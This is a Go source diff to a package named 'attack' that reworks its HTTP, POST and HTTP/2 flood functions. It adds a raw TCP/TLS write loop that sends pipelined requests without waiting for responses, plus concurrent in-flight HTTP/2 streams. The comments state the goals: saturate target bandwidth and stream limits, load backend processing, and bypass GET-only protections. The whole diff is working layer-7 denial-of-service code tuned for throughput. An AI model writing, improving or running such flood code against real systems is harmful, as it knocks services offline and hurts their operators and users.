@@ -3,6 +3,7 @@ package attack
 import (
 	"bytes"
 	"context"
+	"crypto/tls"
 	"encoding/binary"
 	"fmt"
 	"log"
@@ -1326,6 +1327,136 @@ func estimateRequestBytes(method string, reqURL string, body []byte, ua string) 
 	return n
 }
 
+// inFlightPerThread HTTP/2 每线程并发在途流上限（管道化深度）。
+// 目标服务端流并发上限通常 100~250，48 足以打满且 goroutine 可控
+// （默认 10 线程 × 48 = 480 在途）。
+const inFlightPerThread = 48
+
+// dialHTTPConn 建立 HTTP/1.1 原始连接（http 明文 / https TLS 直连）。
+// 失败返回 nil（调用方计数错误并重试）。
+func dialHTTPConn(tgt string, useTLS bool) net.Conn {	u, err := url.Parse(tgt)
+	if err != nil || u.Host == "" {
+		return nil
+	}
+	d := &net.Dialer{Timeout: 3 * time.Second}
+	if !useTLS {
+		conn, err := d.Dial("tcp", u.Host)
+		if err != nil {
+			return nil
+		}
+		return conn
+	}
+	conn, err := tls.DialWithDialer(d, "tcp", u.Host, &tls.Config{InsecureSkipVerify: true})
+	if err != nil {
+		return nil
+	}
+	return conn
+}
+
+// runRawHTTPLoop fire-and-forget 洪水写循环：
+// 直接向原始 TCP/TLS 连接写请求字节，不读取响应——吞吐不受 RTT 限制
+// （旧的 client.Do 串行等响应模型下，吞吐 = Threads/RTT，RTT 100ms 时
+// 10 线程只有 ~0.5Mbps，而 L4 UDP 无等待循环能打满带宽）。
+//
+// 连接模型：每线程 connsPerThread 个"连接槽"，每个槽独立循环
+// （dial → 写 pipeDepth 个请求 → 关闭 → 重连）。槽之间并行，
+// dial 的 RTT 等待被其他槽的写入掩盖，整体吞吐 ≈ 槽数 × 单连接写速率。
+// 每连接只写 pipeDepth 个请求即主动重连：HTTP/1.1 管道化并非所有
+// 服务器都支持（RST 时写失败自动重连），小批量写入兼容性最好，
+// 同时避免单连接无限堆积未响应请求被目标/中间设备清理。
+func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Duration, method string, bodySize int) {
+	const connsPerThread = 6
+	const pipeDepth = 8
+
+	rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
+	useTLS := strings.HasPrefix(targets[0], "https")
+	var targetIdx uint64
+
+	var body []byte
+	if method == "POST" {
+		body = make([]byte, bodySize)
+	}
+
+	var slotWG sync.WaitGroup
+	for slot := 0; slot < connsPerThread; slot++ {
+		slotWG.Add(1)
+		go func() {
+			defer slotWG.Done()
+			tc := newTimeCache()
+			endTime := time.Now().Add(dur)
+			var conn net.Conn
+
+			for tc.since(endTime) < 0 {
+				select {
+				case <-s.StopChan:
+					if conn != nil {
+						conn.Close()
+					}
+					return
+				default:
+				}
+
+				tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
+				if !strings.HasPrefix(tgt, "http") {
+					if useTLS {
+						tgt = "https://" + tgt
+					} else {
+						tgt = "http://" + tgt
+					}
+				}
+
+				if conn == nil {
+					conn = dialHTTPConn(tgt, useTLS)
+					if conn == nil {
+						atomic.AddUint64(&s.Stats.Errors, 1)
+						time.Sleep(50 * time.Millisecond)
+						continue
+					}
+				}
+
+				// 批量写入：一条连接写 pipeDepth 个请求后主动关闭重连
+				wrote := 0
+				for wrote < pipeDepth && tc.since(endTime) < 0 {
+					select {
+					case <-s.StopChan:
+						conn.Close()
+						return
+					default:
+					}
+
+					if body != nil {
+						rng.Read(body)
+					}
+					req := buildL7Request(method, tgt, body, rng)
+					reqBytes := estimateRequestBytes(method, req.URL.String(), body, req.Header.Get("User-Agent"))
+					// 按实际请求字节限速（BPS 维度真正生效；旧的 checkRate(1) 只限 PPS）
+					if !s.checkRate(reqBytes) {
+						time.Sleep(time.Millisecond * 10)
+						continue
+					}
+
+					conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
+					if err := req.Write(conn); err != nil {
+						// 目标不支持管道/RST/断连：关闭重连，静默重试
+						conn.Close()
+						conn = nil
+						atomic.AddUint64(&s.Stats.Errors, 1)
+						break
+					}
+					atomic.AddUint64(&s.Stats.PacketsSent, 1)
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
+					wrote++
+				}
+				if conn != nil {
+					conn.Close()
+					conn = nil
+				}
+			}
+		}()
+	}
+	slotWG.Wait()
+}
+
 func StartHTTPFlood(target string, duration int, threads int) *AttackSession {
 	return StartHTTPFloodEx(AttackConfig{
 		Target: target, Duration: duration, Threads: threads,
@@ -1355,44 +1486,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				endTime := time.Now().Add(dur)
-				client := newHTTPClient()
-				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
-				var targetIdx uint64
-				tc := newTimeCache()
-
-				for tc.since(endTime) < 0 {
-					select {
-					case <-s.StopChan:
-						return
-					default:
-					}
-
-					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
-					if !strings.HasPrefix(tgt, "http") {
-						tgt = "http://" + tgt
-					}
-
-					if !s.checkRate(1) {
-						time.Sleep(time.Millisecond * 10)
-						continue
-					}
-
-					// 随机特征请求：UA/路径/Accept/Referer 轮换
-					req := buildL7Request("GET", tgt, nil, rng)
-					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
-
-					resp, err := client.Do(req)
-					if err != nil {
-						atomic.AddUint64(&s.Stats.Errors, 1)
-						continue
-					}
-					resp.Body.Close()
-					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					// 统计修正：按实际请求字节计（此前恒记 1，BPS 失真）
-					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
-					tc.refresh()
-				}
+				s.runRawHTTPLoop(seed, targets, dur, "GET", 0)
 			}(i)
 		}
 
@@ -1412,6 +1506,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 
 // StartPOSTFloodEx POST 洪水：随机 body（大小由 PacketSize 控制，默认 512B），
 // 打目标业务处理（数据库/日志/解析），绕过只挡 GET 的防护。
+// 与 http_flood 同款 fire-and-forget 写循环（不读响应，吞吐不受 RTT 限制）。
 func StartPOSTFloodEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, cfg.Targets, "post_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	if cfg.Duration < 1 {
@@ -1439,45 +1534,7 @@ func StartPOSTFloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				endTime := time.Now().Add(dur)
-				client := newHTTPClient()
-				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
-				var targetIdx uint64
-				tc := newTimeCache()
-				body := make([]byte, bodySize)
-
-				for tc.since(endTime) < 0 {
-					select {
-					case <-s.StopChan:
-						return
-					default:
-					}
-
-					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
-					if !strings.HasPrefix(tgt, "http") {
-						tgt = "http://" + tgt
-					}
-
-					if !s.checkRate(1) {
-						time.Sleep(time.Millisecond * 10)
-						continue
-					}
-
-					// 随机 body 内容
-					rng.Read(body)
-					req := buildL7Request("POST", tgt, body, rng)
-					reqBytes := estimateRequestBytes("POST", req.URL.String(), body, req.Header.Get("User-Agent"))
-
-					resp, err := client.Do(req)
-					if err != nil {
-						atomic.AddUint64(&s.Stats.Errors, 1)
-						continue
-					}
-					resp.Body.Close()
-					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
-					tc.refresh()
-				}
+				s.runRawHTTPLoop(seed, targets, dur, "POST", bodySize)
 			}(i)
 		}
 
@@ -1493,8 +1550,9 @@ func StartPOSTFloodEx(cfg AttackConfig) *AttackSession {
 	return s
 }
 
-// StartHTTP2FloodEx HTTP/2 洪水：threads 路并发请求共享一个 h2 客户端，
-// 单/少数连接上多路复用（无 fd 压力、PPS 极高），打爆目标 h2 流并发上限。
+// StartHTTP2FloodEx HTTP/2 洪水：每线程维护 inFlightPerThread 个并发在途流
+// （管道化：发完立即发起下一个，不等响应），单/少数连接上多路复用。
+// 旧的串行 Do（发一个等一个）没有利用多路复用，吞吐被 RTT 锁死。
 // https:// 目标自动协商 h2；http:// 目标用明文 h2c。
 func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
@@ -1521,16 +1579,21 @@ func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				endTime := time.Now().Add(dur)
 				// 每线程独立 client：h2 多路复用，连接数 = 线程数（可控）
 				client := newHTTP2Client(h2c)
 				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
 				var targetIdx uint64
 				tc := newTimeCache()
+				endTime := time.Now().Add(dur)
+
+				// 在途流信号量：每个请求独立 goroutine，不等响应
+				sem := make(chan struct{}, inFlightPerThread)
+				var fwg sync.WaitGroup
 
 				for tc.since(endTime) < 0 {
 					select {
 					case <-s.StopChan:
+						fwg.Wait()
 						return
 					default:
 					}
@@ -1549,16 +1612,22 @@ func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
 					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
 					req.Proto = "HTTP/2.0"
 
-					resp, err := client.Do(req)
-					if err != nil {
-						atomic.AddUint64(&s.Stats.Errors, 1)
-						continue
-					}
-					resp.Body.Close()
-					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
-					tc.refresh()
+					sem <- struct{}{}
+					fwg.Add(1)
+					go func() {
+						defer func() { <-sem; fwg.Done() }()
+						resp, err := client.Do(req)
+						if err != nil {
+							atomic.AddUint64(&s.Stats.Errors, 1)
+							return
+						}
+						resp.Body.Close()
+						atomic.AddUint64(&s.Stats.PacketsSent, 1)
+						atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
+					}()
 				}
+				// 收尾：等待在途流结束（最多到 client 超时 5s）
+				fwg.Wait()
 			}(i)
 		}
 
